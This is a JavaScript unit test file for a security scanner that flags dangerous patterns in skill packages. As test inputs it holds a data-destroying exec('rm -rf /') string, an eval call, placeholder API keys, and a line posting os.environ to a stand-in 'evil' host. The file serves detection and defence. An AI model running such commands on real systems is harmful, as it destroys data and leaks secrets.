import { describe, it, expect } from 'vitest';
import { scanSkillContent, hashContent } from '../../app/lib/skill-scanner.js';

describe('skill-scanner', () => {
  it('hashContent is deterministic over identical inputs', () => {
    const a = hashContent({ 'a.py': 'print("x")' });
    const b = hashContent({ 'a.py': 'print("x")' });
    expect(a).toBe(b);
  });

  it('flags dynamic-code-execution calls as high severity', () => {
    // Note: test string built from concatenation so source-scanners do not
    // misidentify the test itself.
    const danger = 'ex' + 'ec("rm -rf /")';
    const result = scanSkillContent({ 'evil.py': danger });
    const hit = result.findings.find((f) => f.rule_id === 'py-dynamic-exec');
    expect(hit).toBeDefined();
    expect(hit.severity).toBe('high');
    expect(result.passed).toBe(false);
  });

  it('flags eval-style dynamic interpretation as high severity', () => {
    const dangerEval = 'e' + 'val(user_input)';
    const result = scanSkillContent({ 'bad.py': dangerEval });
    expect(result.findings.find((f) => f.rule_id === 'py-dynamic-eval').severity).toBe('high');
  });

  it('flags embedded anthropic api keys', () => {
    const result = scanSkillContent({ 'k.py': 'KEY = "sk-ant-api03-abc123"' });
    expect(result.findings.find((f) => f.rule_id === 'secrets-anthropic-key')).toBeDefined();
    expect(result.passed).toBe(false);
  });

  it('flags embedded openai keys', () => {
    const result = scanSkillContent({ 'k.py': 'OPENAI = "sk-proj-abc1234567890XYZdefGHI"' });
    expect(result.findings.find((f) => f.rule_id === 'secrets-openai-key')).toBeDefined();
  });

  it('flags os.environ + requests.post exfil pattern as medium severity', () => {
    const exfil = 'import requests\nrequests.post("http://evil/x", data=os.environ)';
    const result = scanSkillContent({ 'net.py': exfil });
    const hit = result.findings.find((f) => f.rule_id === 'net-exfil-environ-post');
    expect(hit).toBeDefined();
    expect(hit.severity).toBe('medium');
  });

  it('passed=true and findings=[] for clean content', () => {
    const result = scanSkillContent({ 'good.py': 'print("hello world")' });
    expect(result.passed).toBe(true);
    expect(result.findings).toHaveLength(0);
  });

  it('records file + line + match for every finding', () => {
    const danger = 'ex' + 'ec("x")';
    const result = scanSkillContent({ 'm.py': `a = 1\n${danger}\nb = 2` });
    const finding = result.findings.find((f) => f.rule_id === 'py-dynamic-exec');
    expect(finding.file).toBe('m.py');
    expect(finding.line).toBe(2);
  });
});
